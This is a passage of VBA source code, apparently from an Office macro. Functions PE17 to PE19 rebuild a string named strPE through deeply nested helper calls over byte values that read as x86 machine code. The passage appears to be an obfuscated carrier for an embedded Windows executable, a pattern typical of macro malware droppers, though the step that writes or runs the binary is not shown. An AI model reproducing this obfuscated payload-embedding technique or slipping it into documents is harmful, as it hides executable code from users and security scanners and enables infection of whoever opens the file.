    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 195), 254), 129), 198), 10), 0), 255), 255), 131), 200), 255), "&"), 24), 139), 209), 139), 198), 185), 10), 0), 0), 0), 211), 243), 145), 15), 0), "f"), 139), 200), 139), "EH"), 234), 205), 216), 129), 230), 255), "'"), 0), 0), "f"), 157), 136), 255), 192), 2), 31), 206)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(strPE, 192), "F"), 220), 0), "f"), 137), "0"), 131), 238), 2), 137), "Ev"), 139), 19), 12), "f"), 7), 2), 192), 137), "E"), 248), 15), 133), 245), 253), 255), 255), "A^[L"), 229), "]v"), 16), 161), "_^"), 184), 209), 243), 1), 0), "["), 139), 229), "]"), 194)
    strPE = B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 16), 0), 199), 144), 144), 144), 144), 144), 144), 144), 144), 217), 144), 144), 144), 219), "U"), 139), 236), 131), 236), 8), 139), "U"), 12), "SVW"), 212), ":"), 133), 255), 137), "}"), 252), 129), 23), "_^"), 10), 31), "[p"), 229), "]}"), 16), 215), "4}")
    strPE = B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(strPE, 252), 139), "EH"), 131), "8"), 0), "t"), 234), 139), "u"), 8), "3"), 201), "f"), 139), 187), 131), 23), 2), 129), 249), 215), 0), 0), 0), 137), "u"), 8), "F"), 22), "O#"), 176), 139), 251), ";"), 137), 18), 139), "E"), 16), 136), 199), "@"), 137), "E"), 16), 233), "#")

    PE17 = strPE
End Function

Private Function PE18() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 1), 0), "YM"), 221), "J"), 0), 174), 0), 0), "="), 0), 20), 246), 0), 249), 132), 28), 1), 0), 0), "=C"), 216), 30), 162), 28), "F^"), 255), 2), 182), 130), 135), 0), 0), 0), 130), 15), 6), "_"), 208), 250), 226), 0), 252), 0), 30), "5"), 250)
    strPE = A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 220), 0), 0), 15), 133), 245), 0), 0), 0), 129), 225), 255), 3), 0), 0), "%X"), 3), 0), 0), 10), "X"), 10), 11), 193), 131), 198), 2), 141), 139), 216), 139), 250), 129), 195), 0), 0), 1), 0), 137), "u"), 8), 131), "`u"), 235), 7), 139), 193)
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 153), 139), 180), 139), 250), "M"), 195), 139), 215), 185), 11), 0), 0), 0), 232), 212), 11), 0), 0), 139), 200), 190), 1), 0), 0), 0), 11), 202), "+"), 17), 185), 5), 0), 0), 0), 232), "@"), 11), 0), 0), 139), 200), "F"), 11), 202), "u"), 239), 139), "0"), 20)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(strPE, ";2w"), 131), "#"), 255), 255), "-"), 184), 2), 0), 0), 0), 139), "U"), 12), ";"), 198), 139), 249), "J"), 27), "a"), 247), 217), "+"), 193), 131), 201), 255), "H+"), 247), 137), 2), "zE"), 20), 139), 16), 3), ":"), 137), 16), 139), "U"), 16), 133), 246), 141)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(strPE, "L2"), 1), 129), 128), 0), 0), 0), 137), "f"), 1), "t"), 15), 139), 208), 209), 250), 11), 194), "I"), 137), "E"), 252), 138), 215), "$?"), 137), "M"), 248), 12), 128), 139), "U"), 136), 1), 139), 195), 185), 6), 0), 0), "p"), 232), 212), 10), 0), 0), 139), 133)
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(strPE, 248), 139), 216), 16), "E"), 136), "N"), 139), 250), "u"), 208), 20), "U"), 12), 10), 216), 147), "Y"), 255), 139), 147), 133), 192), "'E"), 173), 15), 133), 178), 254), 255), "O_^["), 139), 155), "]"), 149), 248), 0), "_^"), 184), 138), 17), 1), "y[@")
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(strPE, 229), "]"), 194), 16), 0), "_^"), 184), 22), 0), 0), 0), "3"), 139), 229), "]"), 194), 16), 0), 144), 144), 144), "l"), 144), 144), 144), 144), 144), 140), 246), 144), 144), "U"), 139), 236), 139), "E"), 8), 131), 240), 154), "t"), 16), 255), 160), "v"), 193), "@"), 163), 199)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 0), "?'"), 0), 0), 181), 192), 231), 195), 139), "E"), 20), 175), 188), 16), 139), "U"), 12), "PQR"), 232), 20), 0), 0), 0), 131), 196), 12), "]"), 195), 144), 144), "%"), 144), 144), 144), 144), 144), 144), 144), 183), 144), 144), 144), 144), "U"), 139), ","), 139)
    strPE = A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "E"), 16), 139), 252), "S"), 131), 248), 16), "s"), 16), 255), 21), ","), 193), "p"), 0), 199), 180), 28), 0), 0), 0), "%"), 192), "]"), 241), "SV"), 139), 202), 8), "W"), 191), 130), 0), "V"), 133), 216), 11), "F<+"), 136), 161), 16), "v"), 26), 139), "U"), 16)
    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 187), "d"), 0), 0), 0), "%"), 255), 0), 0), 0), "f"), 247), 251), 4), "q"), 136), "s"), 16), 136), 1), "A"), 235), 4), 204), 9), "v"), 23), 139), 128), 16), 187), "L"), 0), 0), 0), "%"), 255), 0), 0), 0), 153), "T"), 251), 4), "L"), 136), 228), 21), 138), 194)
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 4), "w"), 136), 164), "A"), 198), 203), ".AOu"), 187), 139), "E"), 12), "_^M"), 194), 255), "4[]"), 173), "U"), 139), 236), 131), 236), 12), "SV"), 23), "u"), 241), 204), 131), ">"), 0), 253), 17), 199), 236), "-"), 0), 202), "jp^3")
    strPE = B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 175), "["), 139), "h]"), 194), 12), 0), 2), "]"), 8), "DC"), 8), 246), 196), 2), "t"), 213), 139), "C"), 173), "t"), 193), 156), 226), 139), 3), "j"), 20), "P3"), 255), 232), "*"), 155), 255), 127), 139), 200), 137), "8"), 137), "x"), 4), 9), "x"), 8), 137), "t")
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(strPE, 12), "WW"), 142), 223), "x"), 16), 202), 137), "K"), 12), 255), 21), 160), ";@"), 0), 139), "S"), 12), 137), "B"), 16), 204), "C"), 12), 142), "H"), 180), 133), "3u"), 18), 139), "5"), 152), 192), "@"), 0), 255), 214), 133), 192), "u"), 9), "_^[A"), 132)
    strPE = A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 19), 194), 12), 0), 255), 214), 147), "^"), 5), 128), 252), 10), 178), "["), 207), 229), "]"), 194), 12), 0), 139), "C0"), 131), 207), 255), "; JE"), 12), "t("), 18), 185), "0"), 136), 144), 139), 22), "DJ"), 137), 22), 28), "{0"), 139), 14), 137)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "E"), 12), 133), 244), "u"), 17), 4), 6), 143), 0), 0), "/_^-"), 192), "["), 139), 229), 248), 194), 181), 0), 254), 244), ","), 132), 201), 15), 28), 29), 178), 0), 0), 139), "SX"), 139), ">R"), 137), "E"), 252), 137), "}"), 248), 234), 157), 243), 255)
    strPE = A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 238), 131), "{H"), 1), "6-P"), 232), 145), 3), ":"), 0), "3"), 201), 137), "E"), 162), ";"), 193), 156), 21), 212), "CX"), 226), 232), 222), 243), 255), 255), 139), "E"), 8), "x^["), 158), 229), "]"), 194), 12), 13), 137), "K<"), 137), "KH"), 188)
    strPE = A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(strPE, "KD"), 199), "E"), 8), 0), 0), 0), 0), 235), 3), 139), "}"), 248), 133), 255), 15), 134), 157), 0), 0), 0), 139), "K<"), 139), "CD;"), 200), "rY"), 139), "C"), 249), 139), "K8"), 141), "U"), 244), "RP"), 226), "S"), 191), "'"), 0), 0), 153)
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 139), "M="), 173), 210), 131), 196), 16), 194), 202), "pE"), 252), 220), "d"), 139), "sP"), 139), "CT"), 230), 241), 137), 128), "D"), 19), 194), 137), "sP"), 137), "CT"), 137), "*"), 31), 139), 165), "<"), 139), "1D+"), 194), ";"), 248), "w"), 2), 139)
    strPE = A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 199), 139), "s"), 226), 139), "}"), 252), 210), 200), 3), 242), 139), 209), 193), 233), 2), 243), 165), 139), ","), 139), "U"), 252), 131), 225), 3), 3), 150), "M"), 164), 139), 242), "<"), 21), "M"), 248), 3), "h+"), 200), 139), 238), 8), "-s<"), 139), "u"), 243), 137)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 203), 252), 133), 192), 137), 253), 193), 133), 154), "h-"), 255), 255), "K"), 14), 240), "~"), 17), 1), 0), 216), 7), 199), "CU"), 1), 0), 0), 0), 139), "E"), 252), 139), "M"), 12), "+"), 193), 137), 6), "t"), 7), 199), "E"), 8), 0), 147), 0), 224), 139), "C")
    strPE = A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 227), "P"), 232), 182), 243), 255), 255), 139), "E"), 8), 20), "'3"), 139), "R]"), 166), 12), 0), 139), 245), 141), 196), 12), 245), "R~S"), 232), "3G"), 0), 0), 131), "4"), 16), "=U"), 189), 1), 19), 137), "E(a"), 7), 199), "C("), 1)
    strPE = B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 0), 137), 0), 139), "E"), 12), "T"), 137), 6), 139), "E"), 8), "^["), 139), 229), "]"), 194), 12), 175), 144), 7), 144), 144), 144), 144), 144), 144), 144), 144), 144), 185), 170), 185), "U"), 139), 226), "V"), 139), "k"), 8), "W"), 139), "}7"), 139), "F"), 128), 139), "N")
    strPE = B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 167), 11), 165), 199), "E"), 16), 0), 0), 0), 0), "uq"), 138), "F"), 8), 132), 192), 158), "j"), 139), "V"), 144), 141), "M"), 8), 210), 0), "Qj"), 0), "j"), 0), "\"), 0), "R"), 255), 21), 12), "&@"), 0), 133), 192), "u5"), 139), "5"), 152), 192), "@")
    strPE = B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 0), 255), 214), 133), "|u"), 9), 141), "M"), 20), "_^"), 137), 1), "]"), 195), 247), 214), 5), 128), 252), 10), 0), "="), 237), 202), 10), 0), "u"), 5), 184), 226), 17), 1), 0), 139), "M"), 20), "_^"), 199), 1), 0), 0), 0), 23), "]A"), 139), "E")
    strPE = B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(strPE, "y"), 133), 192), "r"), 188), 139), "U"), 173), "_^"), 234), "f"), 184), 27), "mg"), 0), "]"), 195), 220), 234), "v"), 23), 139), 248), 139), "F"), 12), 185), 192), "t#"), 138), "N"), 8), 132), 201), "u0"), 220), "NP"), 216), "H"), 186), 139), "FP"), 139), "V")
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(strPE, "*"), 185), " "), 0), 0), 0), "^7"), 6), 0), 0), 139), "Vc"), 186), "B"), 12), 139), "F"), 12), 139), "U"), 12), "S"), 141), "M"), 16), "P"), 139), "F"), 4), "QWRP"), 255), 21), 16), 192), "@"), 0), "$"), 192), "t"), 7), 191), 1), "A+"), 1)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 34), 0), 252), "="), 152), 195), "@"), 255), 255), 215), 134), 192), 15), 132), 27), 1), 0), 0), 198), 215), 5), 128), 252), 10), 0), "=e"), 0), 11), 245), 229), 133), 211), 0), 0), 0), 139), 29), 156), 192), "@"), 0), 139), "N"), 162), 139), "F"), 16), 133), 254)
    strPE = A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(strPE, "|"), 22), 127), 4), 133), 192), "v"), 16), "j"), 0), "h<"), 3), 0), 143), "Q"), 224), 232), 240), 3), 0), "}"), 235), 13), "#"), 193), 131), 248), 179), 162), 4), 11), 192), 235), 135), "3"), 192), 139), "2"), 12), "P"), 139), "Q"), 16), 180), 246), 211), 139), 248), 129)
    strPE = A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(strPE, 255), 128), 0), 0), 0), "t"), 142), 28), 221), "t1"), 150), "`"), 9), "AG"), 139), "^"), 4), 133), 192), 12), 24), "Ph"), 236), 0), "A"), 0), "P"), 232), "a"), 247), 255), 255), 131), 196), 12), 163), "`"), 9), "A"), 0), 133), 192), "t"), 5), "V"), 255), 208)
    strPE = B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(B(strPE, "b"), 8), "."), 1), 255), 21), "L"), 136), "@"), 0), 157), "N"), 12), 139), "V"), 4), 243), "E"), 16), 148), 1), "P"), 191), "R|"), 21), 180), ">"), 189), 0), 175), 192), "tm3"), 137), 190), "q"), 139), 29), "o"), 192), "@"), 0), "Z"), 211), 133), 192), "te")
    strPE = A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 255), 211), 5), 210), 252), 10), 0), "="), 18), 0), 11), 0), "t"), 7), "=c"), 232), 174), 0), "u"), 26), 129), 255), 237), 1), 0), "XE"), 18), 139), "M9v"), 149), "9[_"), 5), "w"), 17), 1), 0), 137), 17), "^]"), 195), "="), 237), 252)
    strPE = B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(strPE, 10), 0), "u"), 18), "kM"), 20), 139), "U"), 16), 181), "_"), 184), "~"), 17), 226), 0), 162), 184), "^]"), 195), 180), 166), 252), 10), 0), "u"), 18), 200), "M"), 20), 139), "U"), 16), "[]+~"), 197), 1), 0), 137), "S^]"), 195), 192), 192), "u")
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 12), 139), "M"), 16), 133), 201), "u"), 159), 139), "M_"), 139), "U"), 16), "[j"), 184), "~Lw"), 0), 127), 17), "%u8"), 139), "V"), 12), 133), 210), "t"), 162), 239), "V"), 8), 132), 131), "u"), 17), 139), "VP"), 3), 209), 139), "K"), 0), 131), 209)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(strPE, 0), 137), "VP"), 137), "NT"), 139), "M"), 20), 139), 206), 16), "[_"), 137), 140), "^]"), 195), 169), 144), 144), 144), 144), "TU"), 197), 236), ",V"), 139), "u"), 8), 28), "F,"), 237), 192), 15), 132), 190), 0), 0), 0), 23), "NH3"), 192)
    strPE = B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(strPE, "S"), 131), 249), 1), 173), 137), "E"), 252), 14), "E"), 8), 15), 133), 156), 20), 0), 0), 139), "~<;"), 248), 15), 132), 145), 0), 0), 0), 139), "^8&"), 236), 255), "v "), 131), 200), "j"), 235), 246), 139), 199), 139), "V"), 4), 141), "M"), 252), "j")
    strPE = B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 0), "QPSR"), 255), 21), 20), 192), "@"), 0), 133), 192), "t/VE"), 252), 139), "Vu"), 143), "NT"), 3), 208), 131), 209), 0), "+"), 248), 3), "f"), 228), "VP"), 133), 255), 137), "NTwa"), 139), 211), 8), "_"), 199), 249), "<")
    strPE = A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(strPE, 0), "X"), 0), 0), "[^"), 255), "8]"), 194), "u"), 0), 139), "="), 152), 192), "@"), 0), 255), 215), 133), 200), "u"), 5), 217), "E"), 8), 235), 10), 158), 215), 5), "T"), 252), 10), 0), 137), "E"), 8), "j"), 234), 252), "VVP"), 139), "NT"), 3), 208)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(strPE, 139), "EM"), 137), 207), "P"), 131), 209), 0), 243), 192), 137), "NT"), 160), 189), 199), "F<"), 0), 0), 0), 0), 139), "E"), 8), 26), "[^"), 139), 229), "]"), 194), 4), 0), 232), 249), "^"), 139), 229), "]"), 194), 174), 0), 144), 143), 144), 144), 144), 144)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(strPE, "U"), 139), 236), "2E"), 21), 141), 25), 240), 184), "VUUU"), 206), 233), 139), 202), 170), 233), "|"), 3), 209), 141), "{"), 149), 156), 0), "U"), 0), 173), 194), 4), 218), 144), 144), 144), 144), 144), 233), 144), 144), "9"), 144), 144), 144), 144), 5), "U"), 139)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 236), 139), "E"), 16), 139), "M"), 209), 139), "U"), 154), "PQR"), 232), 12), 0), 0), 0), "D"), 219), 12), "U"), 144), 144), 144), 144), "X"), 144), 144), 144), "k"), 139), 236), 139), "U"), 138), 139), ","), 8), "SV"), 141), "J"), 254), "3"), 246), "W"), 139), "}"), 12)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(strPE, "1"), 2), "~03"), 210), "3"), 219), 167), 20), "7"), 131), 198), "@"), 193), 234), 2), "@"), 138), 146), 24), 199), "@"), 0), 28), "P"), 255), 138), "T7"), 253), 138), "\<"), 254), 131), 226), 3), 193), 226), 208), 193), 235), 4), 26), 152), "3"), 219), "@"), 138)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(strPE, 146), "p"), 137), "R"), 227), "XP"), 255), "!T7"), 9), 138), "\S"), 255), 131), 226), 15), 193), 226), 2), 169), 235), 6), 11), 211), "@"), 137), "N"), 24), 199), 23), 0), 136), "P"), 255), 232), 200), "7"), 255), 143), 226), "?@D"), 241), 138), 146), 24)
    strPE = A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(strPE, 199), "@"), 0), 136), "P"), 255), 242), 10), 139), "U"), 16), ";"), 251), "}_-"), 201), 138), "t>v"), 233), 2), "@5"), 138), 189), 188), 231), "@"), 0), ";n"), 136), 24), 8), 138), 20), "szp"), 131), 226), 229), 193), 226), "%@"), 252), 138)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(strPE, 24), 199), "7"), 0), 136), "H"), 255), 198), "s"), 178), 235), "+l"), 0), ">"), 165), "3"), 219), "O"), 226), 3), 138), 154), 193), 226), 4), 5), 235), 4), 230), 211), "@"), 138), 146), 24), 199), "@"), 0), 255), "P"), 255), 138), 9), 131), 225), 15), 138), 20), 141), 147)
    strPE = A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 198), "@"), 0), 136), 16), "@"), 198), 0), "=@"), 144), "UT"), 198), 0), 251), "+"), 202), "_^"), 189), "[]"), 9), 12), 183), 144), 144), 144), 144), 144), 144), 144), 227), "L"), 144), 131), "=XQAd"), 255), 152), 12), 255), "t$"), 4), 255)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(strPE, 21), 248), 192), "@"), 0), "Y"), 195), 0), "T@"), 210), 0), "h#"), 31), " V"), 255), "ty"), 12), 232), 248), 219), 0), 254), 131), 196), "_"), 195), 233), "t$"), 4), 232), 203), 255), 255), 255), 247), 216), 27), 249), "Y"), 247), 216), "H"), 195), 204), 204)
    strPE = A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(strPE, 139), "DD"), 8), 156), "L$"), 16), 11), 11), 139), "L$"), 12), "u"), 4), 139), "D$"), 4), 181), 225), 194), 16), 0), "S"), 247), 225), 139), 216), 139), "D$"), 8), 216), "d$%"), 3), 12), 139), "D$6"), 130), 225), 3), 211), "s"), 194)
    strPE = A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 23), 0), 225), 248), 214), 204), 204), 204), 204), 204), 155), 228), 204), 204), 162), "%@"), 193), "@"), 0), 204), 204), 204), 204), 204), 204), 204), 150), 204), 204), "WVS3"), 255), 139), "5$b"), 11), 192), "}"), 20), "G"), 139), 165), "$%"), 247), 216)
    strPE = A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 247), 218), 131), 216), 0), 137), "D$"), 20), 137), "T$"), 16), 139), "D$"), 28), 11), 192), "}"), 20), "G"), 139), 34), "$"), 24), 247), 216), 241), 218), 131), 216), 0), 137), "D$"), 28), 137), "T$"), 24), 11), 195), 145), 24), "&L$"), 189), 139)

    PE18 = strPE
End Function

Private Function PE19() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(strPE, 237), "$"), 20), "3"), 210), "\"), 241), 139), 216), 139), "D$"), 16), 247), 241), 241), 211), 235), "B"), 139), 216), 139), "LD*"), 139), "T$"), 20), 139), 192), "$"), 16), "!"), 235), 147), 217), 209), 234), 209), 216), 11), 219), 0), "h"), 247), 241), 246), 240), 247)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(strPE, "d$"), 28), 139), "1{D$"), 24), 247), 230), 3), 209), 185), 14), ";T$"), 20), "w"), 8), 14), 7), ";"), 236), "$"), 16), "v"), 1), 171), "3"), 210), "n"), 198), "Ou"), 7), 247), 218), 247), 216), 131), 211), 0), 3), "^_"), 194), 16), 0)
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(strPE, "U"), 139), 236), "j"), 255), "h`"), 199), "@"), 0), 134), 142), 243), "@"), 0), "s"), 161), 0), 0), 0), 0), "PL"), 137), "%"), 0), 0), 0), 0), 131), 236), " "), 239), "VW"), 137), "e"), 232), 22), "e"), 252), 0), "A"), 2), 255), 21), 208), 192), "R"), 136)
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "Y"), 131), 13), "T@A"), 0), 255), 131), 13), "X@A*"), 255), 255), 21), 212), 192), "@"), 0), 139), 13), 152), 11), 213), 0), "!T"), 224), 21), 216), 139), "@"), 0), 139), 13), 148), "eP"), 0), 137), 8), 187), 220), 192), "@"), 0), 139), 0)
    strPE = A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 163), "P@A"), 0), 232), "i"), 2), 0), 0), 131), 21), 143), 2), "A"), 0), 0), "u"), 159), "h"), 21), 185), "@"), 0), 255), 21), 224), 192), "@"), 0), "Y"), 232), "p"), 2), 0), "L"), 236), 12), 208), "@"), 0), "h"), 8), 208), "@"), 0), 232), "["), 2), 0)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(strPE, 0), 161), 144), 11), 171), "h"), 137), "E"), 216), 252), "R"), 130), "P"), 0), "5="), 171), "A"), 15), 141), "E"), 224), "P"), 141), "E"), 153), " "), 141), 248), 228), "P"), 255), 21), 232), 192), "@"), 0), "h"), 4), 30), "@2h"), 177), 208), "V"), 187), 232), "("), 2)
